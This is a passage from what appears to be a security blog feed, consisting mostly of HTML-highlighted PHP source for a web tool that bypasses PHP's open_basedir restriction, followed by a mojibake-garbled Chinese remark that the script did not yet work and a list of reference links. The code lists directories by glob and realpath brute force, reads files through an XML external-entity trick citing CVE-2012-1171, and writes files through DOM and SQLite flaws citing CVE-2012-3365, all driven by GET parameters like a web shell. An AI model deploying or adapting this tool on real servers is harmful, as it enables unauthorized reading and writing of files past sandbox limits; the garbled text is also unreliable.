<span class="title">DirectoryLister</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $currentPath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCurrentPath</span><span class="params">($currentPath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;currentPath = $currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getCurrentPath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;currentPath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GlobWrapperDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> stripos(PHP_OS, <span class="string">'win'</span>) === <span class="keyword">FALSE</span> &amp;&amp; in_array(<span class="string">'glob'</span>, stream_get_wrappers());</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via glob pattern'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$file_list = <span class="keyword">array</span>();</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line">		$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob://&#123;$this-&gt;getCurrentPath()&#125;.*"</span>);</span><br><span class="line">		<span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f) &#123;</span><br><span class="line">			$file_list[] = $f-&gt;__toString();</span><br><span class="line">		&#125;</span><br><span class="line">		sort($file_list);</span><br><span class="line">		<span class="keyword">return</span> $file_list;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealpathBruteForceDirectoryLister</span> <span class="keyword">extends</span> <span class="title">DirectoryLister</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $characters = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-_'</span></span><br><span class="line">	, $extension = <span class="keyword">array</span>()</span><br><span class="line">	, $charactersLength = <span class="number">38</span></span><br><span class="line">	, $maxlength = <span class="number">3</span></span><br><span class="line">	, $fileList = <span class="keyword">array</span>();</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ini_get(<span class="string">'open_basedir'</span>) &amp;&amp; function_exists(<span class="string">'realpath'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Directory listing via brute force searching with realpath function.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setCharacters</span><span class="params">($characters)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;characters = $characters;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;charactersLength = count($characters);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setExtension</span><span class="params">($extension)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;extension = $extension;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setMaxlength</span><span class="params">($maxlength)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;maxlength = $maxlength;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFileList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		set_time_limit(<span class="number">0</span>);</span><br><span class="line">		set_error_handler(<span class="keyword">array</span>(<span class="keyword">__CLASS__</span>, <span class="string">'handler'</span>));</span><br><span class="line">		$number_set = <span class="keyword">array</span>();</span><br><span class="line">		<span class="keyword">while</span> (count($number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, <span class="number">0</span>)) &lt;= <span class="keyword">$this</span>-&gt;maxlength) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;searchFile($number_set);</span><br><span class="line">		&#125;</span><br><span class="line">		sort(<span class="keyword">$this</span>-&gt;fileList);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fileList;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">nextCombination</span><span class="params">($number_set, $length)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">isset</span>($number_set[$length])) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">return</span> $number_set;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($number_set[$length] + <span class="number">1</span> === <span class="keyword">$this</span>-&gt;charactersLength) &#123;</span><br><span class="line">			$number_set[$length] = <span class="number">0</span>;</span><br><span class="line">			$number_set = <span class="keyword">$this</span>-&gt;nextCombination($number_set, $length + <span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$number_set[$length]++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $number_set;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">searchFile</span><span class="params">($number_set)</span> </span>&#123;</span><br><span class="line">		$file_name = <span class="string">'a'</span>;</span><br><span class="line">		<span class="keyword">foreach</span> ($number_set <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">			$file_name[$key] = <span class="keyword">$this</span>-&gt;characters[$value];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// normal files</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name);</span><br><span class="line">		<span class="comment">// files with preceeding dot</span></span><br><span class="line">		realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . <span class="string">'.'</span> . $file_name);</span><br><span class="line">		<span class="comment">// files with extension</span></span><br><span class="line">		<span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;extension <span class="keyword">as</span> $extension) &#123;</span><br><span class="line">			realpath(<span class="keyword">$this</span>-&gt;getCurrentPath() . $file_name . $extension);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">handler</span><span class="params">($errno, $errstr, $errfile, $errline)</span> </span>&#123;</span><br><span class="line">		$regexp = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">		preg_match($regexp, $errstr, $matches);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($matches[<span class="number">1</span>])) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;fileList[] = $matches[<span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileWriter</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">FileReader</span> <span class="keyword">implements</span> <span class="title">Exploitable</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $filePath;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">setFilePath</span><span class="params">($filePath)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = $filePath;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getFilePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;filePath;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// Assistant class for DOMFileWriter &amp; DOMFileReader</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StreamExploiter</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $mode, $filePath, $fileContent;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$doc = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">		$doc-&gt;strictErrorChecking = <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;mode) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">			$doc-&gt;loadHTML(<span class="keyword">$this</span>-&gt;fileContent);</span><br><span class="line">			$doc-&gt;removeChild($doc-&gt;firstChild);</span><br><span class="line">			$doc-&gt;saveHTMLFile(<span class="keyword">$this</span>-&gt;filePath);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">case</span> <span class="string">'r'</span>:</span><br><span class="line">			$doc-&gt;resolveExternals = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;substituteEntities = <span class="keyword">true</span>;</span><br><span class="line">			$doc-&gt;loadXML(<span class="string">"&lt;!DOCTYPE doc [&lt;!ENTITY file SYSTEM \"file://&#123;$this-&gt;filePath&#125;\"&gt;]&gt;&lt;doc&gt;&amp;file;&lt;/doc&gt;"</span>, LIBXML_PARSEHUGE);</span><br><span class="line">			<span class="keyword">echo</span> $doc-&gt;documentElement-&gt;firstChild-&gt;nodeValue;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;filePath = substr($path, <span class="number">10</span>);</span><br><span class="line">		<span class="keyword">$this</span>-&gt;mode = $mode;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_write</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;fileContent = $data;</span><br><span class="line">		<span class="keyword">return</span> strlen($data);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Write to and create a file exploiting CVE-2012-1171 (allow overriding). Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'w'</span>);</span><br><span class="line">		fwrite($_DOM_exploit_resource, $content);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DOMFileReader</span> <span class="keyword">extends</span> <span class="title">FileReader</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> extension_loaded(<span class="string">'dom'</span>) &amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.10'</span>, <span class="string">'&lt;='</span>) || version_compare(phpversion(), <span class="string">'5.4.0'</span>, <span class="string">'='</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Read a file exploiting CVE-2012-1171. Notice the content should be in well-formed XML format.'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// set it to global resource in order to trigger RSHUTDOWN</span></span><br><span class="line">		<span class="keyword">global</span> $_DOM_exploit_resource;</span><br><span class="line">		stream_wrapper_register(<span class="string">'exploit'</span>, <span class="string">'StreamExploiter'</span>);</span><br><span class="line">		$_DOM_exploit_resource = fopen(<span class="string">"exploit://&#123;$this-&gt;getFilePath()&#125;"</span>, <span class="string">'r'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SqliteFileWriter</span> <span class="keyword">extends</span> <span class="title">FileWriter</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">isAvailable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> is_writable(getcwd())</span><br><span class="line">			&amp;&amp; (extension_loaded(<span class="string">'sqlite3'</span>) || extension_loaded(<span class="string">'sqlite'</span>))</span><br><span class="line">			&amp;&amp; (version_compare(phpversion(), <span class="string">'5.3.15'</span>, <span class="string">'&lt;='</span>) || (version_compare(phpversion(), <span class="string">'5.4.5'</span>, <span class="string">'&lt;='</span>) &amp;&amp; PHP_MINOR_VERSION == <span class="number">4</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">getDescription</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">'Create a file with custom content exploiting CVE-2012-3365 (disallow overriding). Junk contents may be inserted'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">		$sqlite_class = extension_loaded(<span class="string">'sqlite3'</span>) ? <span class="string">'sqlite3'</span> : <span class="string">'SQLiteDatabase'</span>;</span><br><span class="line">		mkdir(<span class="string">':memory:'</span>);</span><br><span class="line">		$payload_path = getRelativePath(getcwd() . <span class="string">'/:memory:'</span>, <span class="keyword">$this</span>-&gt;getFilePath());</span><br><span class="line">		$payload = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, $content);</span><br><span class="line">		$database = <span class="keyword">new</span> $sqlite_class(<span class="string">":memory:/&#123;$payload_path&#125;"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"CREATE TABLE foo (bar STRING)"</span>);</span><br><span class="line">		$database-&gt;exec(<span class="string">"INSERT INTO foo (bar) VALUES ('&#123;$payload&#125;')"</span>);</span><br><span class="line">		$database-&gt;close();</span><br><span class="line">		rmdir(<span class="string">':memory:'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// End of Core</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = <span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]) ? $_GET[<span class="string">'action'</span>] : <span class="string">''</span>;</span><br><span class="line">$cwd = <span class="keyword">isset</span>($_GET[<span class="string">'cwd'</span>]) ? $_GET[<span class="string">'cwd'</span>] : getcwd();</span><br><span class="line">$cwd = rtrim($cwd, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;</span><br><span class="line">$directorLister = fallback(<span class="keyword">array</span>(<span class="string">'GlobWrapperDirectoryLister'</span>, <span class="string">'RealpathBruteForceDirectoryLister'</span>));</span><br><span class="line">$fileWriter = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileWriter'</span>, <span class="string">'SqliteFileWriter'</span>));</span><br><span class="line">$fileReader = fallback(<span class="keyword">array</span>(<span class="string">'DOMFileReader'</span>));</span><br><span class="line">$append = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="comment">#panel &#123;</span></span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#panel &gt; pre &#123;</span></span><br><span class="line">  margin: <span class="number">0</span>;</span><br><span class="line">  height: <span class="number">200</span>px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;div id=<span class="string">"panel"</span>&gt;</span><br><span class="line">&lt;pre id=<span class="string">"dl"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Directory Listing:&lt;/legend&gt;Current Directory: &lt;input name=<span class="string">"cwd"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $cwd; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Go"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> (get_class($directorLister) === <span class="string">'RealpathBruteForceDirectoryLister'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$characters = <span class="keyword">isset</span>($_GET[<span class="string">'characters'</span>]) ? $_GET[<span class="string">'characters'</span>] : $directorLister-&gt;characters;</span><br><span class="line">$maxlength = <span class="keyword">isset</span>($_GET[<span class="string">'maxlength'</span>]) ? $_GET[<span class="string">'maxlength'</span>] : $directorLister-&gt;maxlength;</span><br><span class="line">$append = <span class="string">"&amp;characters=&#123;$characters&#125;&amp;maxlength=&#123;$maxlength&#125;"</span>;</span><br><span class="line"> </span><br><span class="line">$directorLister-&gt;setMaxlength($maxlength);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Search Characters: &lt;input name=<span class="string">"characters"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $characters; ?&gt;"</span>&gt;</span><br><span class="line">Maxlength of File: &lt;input name=<span class="string">"maxlength"</span> size=<span class="string">"1"</span> value=<span class="string">"&lt;?php echo $maxlength; ?&gt;"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br><span class="line">Description      : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $directorLister-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file_path = <span class="keyword">isset</span>($_GET[<span class="string">'file_path'</span>]) ? $_GET[<span class="string">'file_path'</span>] : <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;pre id=<span class="string">"rf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Read File :&lt;/legend&gt;File Path: &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Read"</span>&gt;</span><br><span class="line">Description: &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileReader-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"rf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;pre id=<span class="string">"wf"</span>&gt;</span><br><span class="line">open_basedir: &lt;span style=<span class="string">"color: red"</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> ini_get(<span class="string">'open_basedir'</span>) ? ini_get(<span class="string">'open_basedir'</span>) : <span class="string">'Off'</span>; <span class="meta">?&gt;</span>&lt;/span&gt;</span><br><span class="line">&lt;form style=<span class="string">"display:inline-block"</span> action=<span class="string">""</span>&gt;</span><br><span class="line">&lt;fieldset&gt;&lt;legend&gt;Write File :&lt;/legend&gt;File Path   : &lt;input name=<span class="string">"file_path"</span> size=<span class="string">"100"</span> value=<span class="string">"&lt;?php echo $file_path; ?&gt;"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Write"</span>&gt;</span><br><span class="line">File Content: &lt;textarea cols=<span class="string">"70"</span> name=<span class="string">"content"</span>&gt;&lt;/textarea&gt;</span><br><span class="line">Description : &lt;strong&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $fileWriter-&gt;getDescription(); <span class="meta">?&gt;</span>&lt;/strong&gt;&lt;input type=<span class="string">"hidden"</span> name=<span class="string">"action"</span> value=<span class="string">"wf"</span>&gt;</span><br><span class="line">&lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;a href=<span class="string">"#dl"</span>&gt;Directory Listing&lt;/a&gt; | &lt;a href=<span class="string">"#rf"</span>&gt;Read File&lt;/a&gt; | &lt;a href=<span class="string">"#wf"</span>&gt;Write File&lt;/a&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span> ($action === <span class="string">'rf'</span>): <span class="meta">?&gt;</span></span><br><span class="line">&lt;plaintext&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$fileReader-&gt;setFilePath($file_path);</span><br><span class="line"><span class="keyword">echo</span> $fileReader-&gt;read();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">elseif</span> ($action === <span class="string">'wf'</span>): <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>])) &#123;</span><br><span class="line">	$fileWriter-&gt;setFilePath($file_path);</span><br><span class="line">	$fileWriter-&gt;write($_GET[<span class="string">'content'</span>]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'The file should be written.'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Something goes wrong.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">&lt;ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$directorLister-&gt;setCurrentPath($cwd);</span><br><span class="line">$file_list = $directorLister-&gt;getFileList();</span><br><span class="line">$parent_path = dirname($cwd);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$parent_path&#125;&#123;$append&#125;#dl'&gt;Parent&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (count($file_list) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $file) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;li&gt;&lt;a href='?cwd=&#123;$cwd&#125;&#123;$file&#125;&#123;$append&#125;#dl'&gt;&#123;$file&#125;&lt;/a&gt;&lt;/li&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'No files found. The path is probably not a directory.'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/ol&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">endif</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php-about/open-base-dir/php-script-neixinming.png" alt="php-script-neixinming"></p>
<ul>
<li>â–² 2020.08.29 è„šæœ¬æš‚æœªæˆåŠŸç»•è¿‡ï¼Œä½†æä¾›äº†ä¸€ä¸ªç»•è¿‡çš„æ€è·¯</li>
</ul>
<h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul>
<li><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHPç»•è¿‡open_basediråˆ—ç›®å½•çš„ç ”ç©¶</a></p>
</li>
<li><p><a href="https://www.jianshu.com/p/cf2cd07d02cf" target="_blank" rel="noopener">PHPç»•è¿‡open_basediré™åˆ¶æ“ä½œæ–‡ä»¶çš„ä¸‰ç§æ–¹æ³•</a></p>
</li>
<li><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5å…¨ç‰ˆæœ¬ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p>
</li>
<li><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">ç»•è¿‡open_basedirè¯»æ–‡ä»¶è„šæœ¬</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>php-about</category>
      </categories>
  </entry>
  <entry>
    <title>SOP_CORS_CSP</title>
    <url>/2020/08/19/sop_cors_csp/</url>
